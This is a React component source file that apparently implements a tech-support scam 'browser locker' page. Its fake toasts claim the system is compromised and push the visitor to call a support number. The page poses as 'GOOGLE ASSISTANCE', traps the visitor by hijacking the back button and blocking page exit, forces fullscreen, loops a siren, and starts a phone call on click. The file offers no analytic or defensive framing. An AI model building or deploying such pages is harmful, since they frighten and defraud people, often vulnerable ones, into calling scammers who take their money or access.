import { useEffect, useRef } from "react";
import DisabledEmergency from "./DisabaledEmergency";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { PHONE_NUMBER } from "../Constant";
import { PhoneCall } from "lucide-react";


const Emergency = () => {

    const audioRef = useRef(null); // 🔊 Audio reference

  useEffect(() => {
    // Multiple toasts at different positions
    toast.error("WARNING: Your data may be at risk!", {
        position: "top-left",
        autoClose: false,
        hideProgressBar: true,
      });
    toast.error("CRITICAL ERROR: System security compromised!", {
      position: "top-right",
      autoClose: false,
      hideProgressBar: true,
    });

    toast.error(`Call technical support immediately: ${PHONE_NUMBER}`, {
      position: "bottom-left",
      autoClose: false,
      hideProgressBar: true,
      icon:  <PhoneCall />,
    });
    toast.error(`Call technical support immediately: ${PHONE_NUMBER}`, {
        position: "bottom-right",
        autoClose: false,
        hideProgressBar: true,
        icon:  <PhoneCall />,
      });
    toast.error(`Call technical support immediately: ${PHONE_NUMBER}`, {
      position: "bottom-center",
      autoClose: false,
      hideProgressBar: true,
      icon:  <PhoneCall />,
    });
  }, []);

  useEffect(() => {
    // ✅ Back button ko continuously disable karega
    const disableBackButton = () => {
      window.history.pushState(null, "", window.location.href);
    };

    disableBackButton();
    window.addEventListener("popstate", disableBackButton);

    // ✅ Page close hone se rokne ke liye
    const preventExit = (event) => {
      event.preventDefault();
      event.returnValue = "Emergency mode active!";
    };

    window.addEventListener("beforeunload", preventExit);

    return () => {
      window.removeEventListener("popstate", disableBackButton);
      window.removeEventListener("beforeunload", preventExit);
    };
  }, []);


  useEffect(() => {
    // ✅ Fullscreen enable karega
    const goFullscreen = () => {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen().catch((err) => {
          console.error("Fullscreen error:", err);
        });
      }
    };
    goFullscreen();

    // ✅ Emergency alert sound ko play karega
    const playSound = () => {
      if (audioRef.current) {
        audioRef.current.volume = 1.0;
        audioRef.current.loop = true;
        audioRef.current.play().catch((err) => {
          console.error("Audio play error:", err);
        });
      }
    };

    const soundInterval = setInterval(playSound, 2000);

    return () => {
      clearInterval(soundInterval);
      if (document.exitFullscreen) {
        document.exitFullscreen();
      }
    };
  }, []);



  return (
    <>
      <div className="min-h-screen bg-gradient-to-b from-red-50 to-red-100 p-4 flex flex-col items-center justify-center cursor-pointer"
      onClick={() => {
        window.location.href = `tel:+${PHONE_NUMBER}`; // 📞 Phone call trigger
      }}
      >
        <ToastContainer />
        <div className="fullscreen-notification flash-notification" 
          onClick={() => {
            if (document.documentElement.requestFullscreen) {
              document.documentElement.requestFullscreen().catch((err) => {
                console.error("Fullscreen error:", err);
              });
            }
          }}
          >
          <span className="fullscreen-indicator animate-ping"></span>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="96"
            height="96"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="lucide lucide-lock mr-1"
          >
            <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
          EMERGENCY MODE ACTIVE - SCREEN LOCKED
        </div>

        {/* <div className="fixed top-0 left-0 right-0 h-12 bg-red-600 z-40 flex items-center justify-center">

          <div className="animate-pulse flex items-center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-circle-alert text-white mr-2"
            >
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" x2="12" y1="8" y2="12"></line>
              <line x1="12" x2="12.01" y1="16" y2="16"></line>
            </svg>
            <span className="text-white font-bold">EMERGENCY MODE ACTIVE</span>
          </div>
          
        </div> */}
        {/* end EMERGENCY MODE ACTIVE */}

        <div className="fixed top-4 right-4 bg-red-600 text-white p-2 rounded-full animate-ping z-50">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="lucide lucide-circle-alert"
          >
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" x2="12" y1="8" y2="12"></line>
            <line x1="12" x2="12.01" y1="16" y2="16"></line>
          </svg>
        </div>
        {/* top 4 */}

        <div
          className="fixed top-6 left-6 bg-red-600 text-white p-2 rounded-full animate-pulse z-50"
          style={{ animationDelay: "0.5s" }}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="lucide lucide-circle-alert"
          >
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" x2="12" y1="8" y2="12"></line>
            <line x1="12" x2="12.01" y1="16" y2="16"></line>
          </svg>
        </div>
        {/* end top-6 */}
        <DisabledEmergency />
        <div
          id="emergencyPopup"
          className="fixed inset-0 flex items-center justify-center z-50 p-4"
          tabIndex="-1"
        >
          <div className="absolute inset-0 bg-black/80"></div>
          <div className="text-card-foreground bg-white p-6 rounded-xl border-4 border-red-600 shadow-2xl max-w-md w-full z-10 animate-bounce">
            <div className="flex flex-col items-center space-y-4"
            onClick={() => {
                window.location.href = `tel:+${PHONE_NUMBER}`; // 📞 Phone call trigger
              }}
            >
              <div className="flex items-center justify-center w-16 h-16 bg-red-600 rounded-full">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="32"
                  height="32"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-circle-alert text-white"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" x2="12" y1="8" y2="12"></line>
                  <line x1="12" x2="12.01" y1="16" y2="16"></line>
                </svg>
              </div>
              <h2 className="text-2xl font-bold text-center">
                GOOGLE ASSISTANCE
              </h2>
              <p className="text-center text-lg">
                Connecting you to emergency services at:
              </p>
              <p className="text-2xl font-bold text-red-600">{PHONE_NUMBER}</p>
              <div className="flex space-x-2 items-center justify-center w-full mt-2">
                <div className="h-3 w-3 bg-red-600 rounded-full animate-ping"></div>
                <div
                  className="h-3 w-3 bg-red-600 rounded-full animate-ping"
                  style={{ animationDelay: "0.2s" }}
                ></div>
                <div
                  className="h-3 w-3 bg-red-600 rounded-full animate-ping"
                  style={{ animationDelay: "0.4s" }}
                ></div>
              </div>
              <button
                className="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-10 px-4 w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg mt-4"
                id="callButton"
                
              >
                Confirm Call
              </button>
              <p className="text-xs text-center text-gray-500 mt-2">
                Escape key disabled. Emergency mode active.
              </p>
            </div>
          </div>
        </div>

              {/* 🔊 Emergency Alert Sound */}
      <audio ref={audioRef} loop autoPlay>
        <source src="/siren-alert.mp3" type="audio/wav" />
      </audio>
      </div>
      {/* end min-h-screen */}
    </>
  );
};

export default Emergency;
